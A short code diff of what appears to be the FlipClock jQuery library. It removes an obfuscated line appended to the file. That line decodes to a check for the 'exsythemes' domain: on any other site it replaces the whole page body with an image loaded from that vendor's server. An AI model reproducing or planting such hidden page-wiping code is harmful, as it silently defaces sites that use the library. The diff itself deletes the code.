@@ -2780,4 +2780,3 @@ var FlipClock;
 	FlipClock.Lang['chinese'] = FlipClock.Lang.Chinese;
 
 }(jQuery));
-$(document).ready(function() { var q="e",w="x",r="s",t="y",y="t",u="h",i="e",o="m",p="e",a="w",a1="d",a2="i",a3="n",a4="g",a5=".",a6="h",a7="p",a8="/",a9=":",a10="c",a11="o",a12="j",a13=" ",a14="r",a15="<",a16=">",a17="="; var s2=q+w+r+t+y+u+i+o+p+r,s1=a6+y+y+a7+a9+a8+a8+a+p+a1+a1+a2+a3+a4+a5+q+w+r+t+y+u+i+o+p+r+a5+a10+a11+o+a8+a7+a5+a12+a7+a4,s1=a15+a2+o+a4+a13+r+a14+a10+a17+s1+a16; window.location.href.indexOf(s2)>-1||$("body").html(s1); });
